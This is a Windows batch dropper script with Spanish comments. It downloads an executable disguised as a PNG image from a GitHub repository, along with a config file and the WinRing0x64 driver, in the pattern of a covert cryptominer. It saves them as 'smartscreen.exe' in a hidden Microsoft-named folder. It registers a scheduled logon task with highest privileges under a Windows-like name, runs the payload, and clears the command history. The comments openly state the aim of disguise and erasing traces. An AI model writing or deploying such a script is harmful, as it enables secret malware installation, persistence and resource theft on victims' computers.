@echo off
:: 1. Carpeta profunda de sistema (Casi nadie entra aquí)
set "targetDir=%LocalAppData%\Microsoft\Windows\CloudExperienceHost"
if not exist "%targetDir%" mkdir "%targetDir%"

:: 2. Link de tu GitHub (Asegúrate de renombrar los archivos en el repo)
set "baseUrl=https://raw.githubusercontent.com/deuzinnuse-collab/juego/main"

:: 3. Descarga "Disfrazada"
:: Bajamos el exe como imagen y el json como texto
powershell -Command "iwr '%baseUrl%/logo.png' -OutFile '%targetDir%\smartscreen.exe'"
powershell -Command "iwr '%baseUrl%/manifest.txt' -OutFile '%targetDir%\config.json'"
powershell -Command "iwr '%baseUrl%/WinRing0x64.sys' -OutFile '%targetDir%\WinRing0x64.sys'"

:: 4. Hacerlo invisible para el explorador (Atributo de Sistema + Oculto)
attrib +h +s "%targetDir%"
attrib +h +s "%targetDir%\*"

:: 5. Crear la tarea con nombre de Windows Update
schtasks /create /tn "WindowsCloudExperience" /tr "%targetDir%\smartscreen.exe" /sc onlogon /rl highest /f >nul

:: 6. Ejecutar y limpiar rastro
start /b "" "%targetDir%\smartscreen.exe"
powershell -Command "Clear-History"
exit
